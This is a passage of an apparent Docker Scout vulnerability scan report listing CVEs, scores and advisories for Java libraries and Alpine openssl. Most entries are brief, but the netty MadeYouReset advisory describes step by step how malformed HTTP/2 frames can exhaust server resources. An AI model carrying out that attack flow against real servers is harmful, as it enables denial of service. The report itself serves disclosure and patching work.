protobuf-javalite (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-kotlin (3.21.7, 3.20.3, 3.19.6, 3.16.3)
protobuf-kotlin-lite (3.21.7, 3.20.3, 3.19.6, 3.16.3)
google-protobuf [JRuby gem only] (3.21.7, 3.20.3, 3.19.6)


</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-22570?s=gitlab&n=protobuf-java&ns=com.google.protobuf&t=maven&vr=%3C3.15.0"><img alt="medium 5.5: CVE--2021--22570" src="https://img.shields.io/badge/CVE--2021--22570-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code><3.15.0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.15.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.150%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Nullptr dereference when a null char is present in a proto symbol. The symbol is parsed incorrectly, leading to an unchecked call into the proto file's name during generation of the resulting error message. Since the symbol is incorrectly parsed, the file is nullptr.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 4" src="https://img.shields.io/badge/H-4-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.codehaus.jettison/jettison</strong> <code>1.1</code> (maven)</summary>

<small><code>pkg:maven/org.codehaus.jettison/jettison@1.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-1436?s=github&n=jettison&ns=org.codehaus.jettison&t=maven&vr=%3C1.5.4"><img alt="high 7.5: CVE--2023--1436" src="https://img.shields.io/badge/CVE--2023--1436-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Recursion</i>

<table>
<tr><td>Affected range</td><td><code><1.5.4</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An infinite recursion is triggered in Jettison when constructing a JSONArray from a Collection that contains a self-reference in one of its elements. This leads to a StackOverflowError exception being thrown.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-45693?s=github&n=jettison&ns=org.codehaus.jettison&t=maven&vr=%3C1.5.2"><img alt="high 7.5: CVE--2022--45693" src="https://img.shields.io/badge/CVE--2022--45693-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Out-of-bounds Write</i>

<table>
<tr><td>Affected range</td><td><code><1.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Jettison before v1.5.2 was discovered to contain a stack overflow via the map parameter. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted string.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-45685?s=github&n=jettison&ns=org.codehaus.jettison&t=maven&vr=%3C1.5.2"><img alt="high 7.5: CVE--2022--45685" src="https://img.shields.io/badge/CVE--2022--45685-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Out-of-bounds Write</i>

<table>
<tr><td>Affected range</td><td><code><1.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A stack overflow in Jettison before v1.5.2 allows attackers to cause a Denial of Service (DoS) via crafted JSON data.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-40150?s=github&n=jettison&ns=org.codehaus.jettison&t=maven&vr=%3C1.5.2"><img alt="high 7.5: CVE--2022--40150" src="https://img.shields.io/badge/CVE--2022--40150-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><1.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Those using Jettison to parse untrusted XML or JSON data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by Out of memory. This effect may support a denial of service attack.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-40149?s=github&n=jettison&ns=org.codehaus.jettison&t=maven&vr=%3C1.5.1"><img alt="medium 6.5: CVE--2022--40149" src="https://img.shields.io/badge/CVE--2022--40149-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Stack-based Buffer Overflow</i>

<table>
<tr><td>Affected range</td><td><code><1.5.1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.521%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Those using Jettison to parse untrusted XML or JSON data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.netty/netty-codec-http2</strong> <code>4.1.96.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty-codec-http2@4.1.96.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-55163?s=github&n=netty-codec-http2&ns=io.netty&t=maven&vr=%3C%3D4.1.123.Final"><img alt="high 8.2: CVE--2025--55163" src="https://img.shields.io/badge/CVE--2025--55163-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><=4.1.123.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.124.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.102%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Below is a technical explanation of a newly discovered vulnerability in HTTP/2, which we refer to as “MadeYouReset.”

### MadeYouReset Vulnerability Summary
The MadeYouReset DDoS vulnerability is a logical vulnerability in the HTTP/2 protocol, that uses malformed HTTP/2 control frames in order to break the max concurrent streams limit - which results in resource exhaustion and distributed denial of service.

### Mechanism
The vulnerability uses malformed HTTP/2 control frames, or malformed flow, in order to make the server reset streams created by the client (using the RST_STREAM frame). 
The vulnerability could be triggered by several primitives, defined by the RFC of HTTP/2 (RFC 9113). The Primitives are:
1. WINDOW_UPDATE frame with an increment of 0 or an increment that makes the window exceed 2^31 - 1. (section 6.9 + 6.9.1)
2. HEADERS or DATA frames sent on a half-closed (remote) stream (which was closed using the END_STREAM flag). (note that for some implementations it's possible a CONTINUATION frame to trigger that as well - but it's very rare). (Section 5.1)
3. PRIORITY frame with a length other than 5. (section 6.3)
From our experience, the primitives are likely to exist in the decreasing order listed above.
Note that based on the implementation of the library, other primitives (which are not defined by the RFC) might exist - meaning scenarios in which RST_STREAM is not supposed to be sent, but in the implementation it does. On the other hand - some RFC-defined primitives might not work, even though they are defined by the RFC (as some implementations are not fully complying with RFC). For example, some implementations we’ve seen discard the PRIORITY frame - and thus does not return RST_STREAM, and some implementations send GO_AWAY when receiving a WINDOW_UPDATE frame with increment of 0.

The vulnerability takes advantage of a design flaw in the HTTP/2 protocol - While HTTP/2 has a limit on the number of concurrently active streams per connection (which is usually 100, and is set by the parameter SETTINGS_MAX_CONCURRENT_STREAMS), the number of active streams is not counted correctly - when a stream is reset, it is immediately considered not active, and thus unaccounted for in the active streams counter. 
While the protocol does not count those streams as active, the server’s backend logic still processes and handles the requests that were canceled.

Thus, the attacker can exploit this vulnerability to cause the server to handle an unbounded number of concurrent streams from a client on the same connection. The exploitation is very simple: the client issues a request in a stream, and then sends the control frame that causes the server to send a RST_STREAM.

### Attack Flow
For example, a possible attack scenario can be: 
1. Attacker opens an HTTP/2 connection to the server.
2. Attacker sends HEADERS frame with END_STREAM flag on a new stream X.  
3. Attacker sends WINDOW_UPDATE for stream X with flow-control window of 0.
4. The server receives the WINDOW_UPDATE and immediately sends RST_STREAM for stream X to the client (+ decreases the active streams counter by 1).

The attacker can repeat steps 2+3 as rapidly as it is capable, since the active streams counter never exceeds 1 and the attacker does not need to wait for the response from the server.
This leads to resource exhaustion and distributed denial of service vulnerabilities with an impact of: CPU overload and/or memory exhaustion (implementation dependent)

### Comparison to Rapid Reset
The vulnerability takes advantage of a design flow in the HTTP/2 protocol that was also used in the Rapid Reset vulnerability (CVE-2023-44487) which was exploited as a zero-day in the wild in August 2023 to October 2023, against multiple services and vendors.
The Rapid Reset vulnerability uses RST_STREAM frames sent from the client, in order to create an unbounded amount of concurrent streams - it was given a CVSS score of 7.5.
Rapid Reset was mostly mitigated by limiting the number/rate of RST_STREAM sent from the client, which does not mitigate the MadeYouReset attack - since it triggers the server to send a RST_STREAM.

### Suggested Mitigations for MadeYouReset
A quick and easy mitigation will be to limit the number/rate of RST_STREAMs sent from the server.
It is also possible to limit the number/rate of control frames sent by the client (e.g. WINDOW_UPDATE and PRIORITY), and treat protocol flow errors as a connection error.

As mentioned in our previous message, this is a protocol-level vulnerability that affects multiple vendors and implementations. Given its broad impact, it is the shared responsibility of all parties involved to handle the disclosure process carefully and coordinate mitigations effectively.


If you have any questions, we will be happy to clarify or schedule a Zoom call.

Gal, Anat and Yaniv.

</blockquote>
</details>

<a href="https://scout.docker.com/v/GHSA-xpw8-rcwv-8f8p?s=github&n=netty-codec-http2&ns=io.netty&t=maven&vr=%3C4.1.100.Final"><img alt="high 7.5: GHSA--xpw8--rcwv--8f8p" src="https://img.shields.io/badge/GHSA--xpw8--rcwv--8f8p-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><4.1.100.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.100.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A client might overload the server by issue frequent RST frames. This can cause a massive amount of load on the remote system and so cause a DDOS attack. 

### Impact
This is a DDOS attack, any http2 server is affected and so you should update as soon as possible.

### Patches
This is patched in version 4.1.100.Final.

### Workarounds
A user can limit the amount of RST frames that are accepted per connection over a timeframe manually using either an own `Http2FrameListener` implementation or an `ChannelInboundHandler` implementation (depending which http2 API is used).

### References
- https://www.cve.org/CVERecord?id=CVE-2023-44487
- https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
- https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-44487?s=gitlab&n=netty-codec-http2&ns=io.netty&t=maven&vr=%3C4.1.100"><img alt="high 7.5: CVE--2023--44487" src="https://img.shields.io/badge/CVE--2023--44487-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code><4.1.100</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.100.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>94.424%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly, as exploited in the wild in August through October 2023.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>net.minidev/json-smart</strong> <code>1.3.2</code> (maven)</summary>

<small><code>pkg:maven/net.minidev/json-smart@1.3.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-1370?s=github&n=json-smart&ns=net.minidev&t=maven&vr=%3C2.4.9"><img alt="high 7.5: CVE--2023--1370" src="https://img.shields.io/badge/CVE--2023--1370-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Recursion</i>

<table>
<tr><td>Affected range</td><td><code><2.4.9</code></td></tr>
<tr><td>Fixed version</td><td><code>2.4.9</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
Affected versions of [net.minidev:json-smart](https://github.com/netplex/json-smart-v1) are vulnerable to Denial of Service (DoS) due to a StackOverflowError when parsing a deeply nested JSON array or object.

When reaching a ‘[‘ or ‘{‘ character in the JSON input, the code parses an array or an object respectively. It was discovered that the 3PP does not have any limit to the nesting of such arrays or objects. Since the parsing of nested arrays and objects is done recursively, nesting too many of them can cause stack exhaustion (stack overflow) and crash the software.

### Patches
This vulnerability was fixed in json-smart version 2.4.9, but the maintainer recommends upgrading to 2.4.10, due to a remaining bug.

### Workarounds
N/A

### References
- https://www.cve.org/CVERecord?id=CVE-2023-1370
- https://nvd.nist.gov/vuln/detail/CVE-2023-1370
- https://security.snyk.io/vuln/SNYK-JAVA-NETMINIDEV-3369748

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-31684?s=github&n=json-smart&ns=net.minidev&t=maven&vr=%3E%3D1.3.0%2C%3C1.3.3"><img alt="high 7.5: CVE--2021--31684" src="https://img.shields.io/badge/CVE--2021--31684-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Out-of-bounds Read</i>

<table>
<tr><td>Affected range</td><td><code>>=1.3.0<br/><1.3.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.3.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.117%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was discovered in the indexOf function of JSONParserByteArray in JSON Smart versions prior to 1.3.3 and 2.4.5 which causes a denial of service (DOS) via a crafted web request.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>ch.qos.logback/logback-core</strong> <code>1.2.10</code> (maven)</summary>

<small><code>pkg:maven/ch.qos.logback/logback-core@1.2.10</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-6378?s=github&n=logback-core&ns=ch.qos.logback&t=maven&vr=%3C1.2.13"><img alt="high 7.1: CVE--2023--6378" src="https://img.shields.io/badge/CVE--2023--6378-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Deserialization of Untrusted Data</i>

<table>
<tr><td>Affected range</td><td><code><1.2.13</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.13</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.613%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A serialization vulnerability in logback receiver component part of logback allows an attacker to mount a Denial-Of-Service attack by sending poisoned data.

This is only exploitable if logback receiver component is deployed. See https://logback.qos.ch/manual/receivers.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11226?s=github&n=logback-core&ns=ch.qos.logback&t=maven&vr=%3C1.3.16"><img alt="medium 5.9: CVE--2025--11226" src="https://img.shields.io/badge/CVE--2025--11226-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Input Validation</i>

<table>
<tr><td>Affected range</td><td><code><1.3.16</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.19</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:P/VC:H/VI:L/VA:L/SC:H/SI:L/SA:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.071%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

QOS.CH logback-core versions up to 1.5.18 contain an ACE vulnerability in conditional configuration file processing in Java applications. This vulnerability allows an attacker to execute arbitrary code by compromising an existing logback configuration file or by injecting a malicious environment variable before program execution.

A successful attack requires the Janino library and Spring Framework to be present on the user's class path. Additionally, the attacker must have write access to a configuration file. Alternatively, the attacker could inject a malicious environment variable pointing to a malicious configuration file. In both cases, the attack requires existing privileges.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-12798?s=github&n=logback-core&ns=ch.qos.logback&t=maven&vr=%3C1.3.15"><img alt="medium 5.9: CVE--2024--12798" src="https://img.shields.io/badge/CVE--2024--12798-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')</i>

<table>
<tr><td>Affected range</td><td><code><1.3.15</code></td></tr>
<tr><td>Fixed version</td><td><code>1.3.15</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:L/RE:L/U:Clear</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.290%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ACE vulnerability in JaninoEventEvaluator by QOS.CH logback-core up to and including version 1.5.12 in Java applications allows attackers to execute arbitrary code by compromising an existing logback configuration file or by injecting an environment variable before program execution.

Malicious logback configuration files can allow the attacker to execute arbitrary code using the JaninoEventEvaluator extension.

A successful attack requires the user to have write access to a configuration file. Alternatively, the attacker could inject a malicious environment variable pointing to a malicious configuration file. In both cases, the attack requires existing privilege.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-12801?s=github&n=logback-core&ns=ch.qos.logback&t=maven&vr=%3C1.3.15"><img alt="low 2.4: CVE--2024--12801" src="https://img.shields.io/badge/CVE--2024--12801-lightgrey?label=low%202.4&labelColor=fce1a9"/></a> <i>Server-Side Request Forgery (SSRF)</i>

<table>
<tr><td>Affected range</td><td><code><1.3.15</code></td></tr>
<tr><td>Fixed version</td><td><code>1.3.15</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:N/VA:L/SC:H/SI:H/SA:H/V:D/U:Clear</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Server-Side Request Forgery (SSRF) in SaxEventRecorder by QOS.CH logback version 1.5.12 on the Java platform, allows an attacker to forge requests by compromising logback configuration files in XML.
 
The attacks involves the modification of DOCTYPE declaration in  XML configuration files.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.3.3-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/openssl@3.3.3-r0?os_name=alpine&os_version=3.20</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-9230?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C3.3.5-r0"><img alt="high : CVE--2025--9230" src="https://img.shields.io/badge/CVE--2025--9230-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.3.5-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.5-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9231?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C3.3.5-r0"><img alt="medium : CVE--2025--9231" src="https://img.shields.io/badge/CVE--2025--9231-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.3.5-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.5-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9232?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C3.3.5-r0"><img alt="medium : CVE--2025--9232" src="https://img.shields.io/badge/CVE--2025--9232-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.3.5-r0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.3.5-r0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-server</strong> <code>9.4.51.v20230217</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-server@9.4.51.v20230217</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-13009?s=github&n=jetty-server&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.4.0%2C%3C%3D9.4.56"><img alt="high 7.2: CVE--2024--13009" src="https://img.shields.io/badge/CVE--2024--13009-lightgrey?label=high%207.2&labelColor=e25d68"/></a> <i>Improper Resource Shutdown or Release</i>

<table>
<tr><td>Affected range</td><td><code>>=9.4.0<br/><=9.4.56</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.57.v20241219</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.074%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Eclipse Jetty versions 9.4.0 to 9.4.56 a buffer can be incorrectly released when confronted with a gzip error when inflating a request body. This can result in corrupted and/or inadvertent sharing of data between requests.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-8184?s=github&n=jetty-server&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.3.12%2C%3C%3D9.4.55"><img alt="medium 5.9: CVE--2024--8184" src="https://img.shields.io/badge/CVE--2024--8184-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=9.3.12<br/><=9.4.55</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.56</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.487%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
Remote DOS attack can cause out of memory 

### Description
There exists a security vulnerability in Jetty's `ThreadLimitHandler.getRemote()` which
can be exploited by unauthorized users to cause remote denial-of-service (DoS) attack.  By
repeatedly sending crafted requests, attackers can trigger OutofMemory errors and exhaust the
server's memory.

### Affected Versions

* Jetty 12.0.0-12.0.8 (Supported)
* Jetty 11.0.0-11.0.23 (EOL)
* Jetty 10.0.0-10.0.23 (EOL)
* Jetty 9.3.12-9.4.55 (EOL)

### Patched Versions

* Jetty 12.0.9
* Jetty 11.0.24
* Jetty 10.0.24
* Jetty 9.4.56

### Workarounds

Do not use `ThreadLimitHandler`.  
Consider use of `QoSHandler` instead to artificially limit resource utilization.

### References

Jetty 12 - https://github.com/jetty/jetty.project/pull/11723

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-40167?s=gitlab&n=jetty-server&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.0.0%2C%3C9.4.52"><img alt="medium 5.3: CVE--2023--40167" src="https://img.shields.io/badge/CVE--2023--40167-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.4.52</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.52.v20230823, 10.0.16, 11.0.16, 12.0.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>5.222%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

